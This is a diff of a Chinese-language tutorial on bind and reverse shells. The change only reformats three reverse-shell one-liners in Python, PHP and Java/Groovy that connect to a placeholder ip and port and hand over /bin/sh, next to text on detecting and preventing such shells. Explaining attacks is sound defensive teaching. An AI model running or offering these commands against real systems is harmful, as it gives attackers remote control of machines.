@@ -47,9 +47,9 @@ Bind Shell 过程：
 
 编程语言也可作为被控端程序，例如
 
-- python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((ip,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+- python: `python -c 'import socket, subprocess, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((ip, port)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p = subprocess.call(["/bin/sh", "-i"])'`
 - php: `php -r '$sock=fsockopen($IP,$PORT);exec("/bin/sh -i <&3 >&3 2>&3");'`
-- java: `r=Runtime.getRuntime();p=r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ip/port;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor()`
+- java: `r = Runtime.getRuntime(); p = r.exec(["/bin/bash", "-c", "exec 5<>/dev/tcp/ip/port; cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor()`
 
 一旦机器被控制，除了断绝访问外网能力，Reverse Shell 一般没有太好的防范方法。但仍然有以下手段加以预防和检测：
 
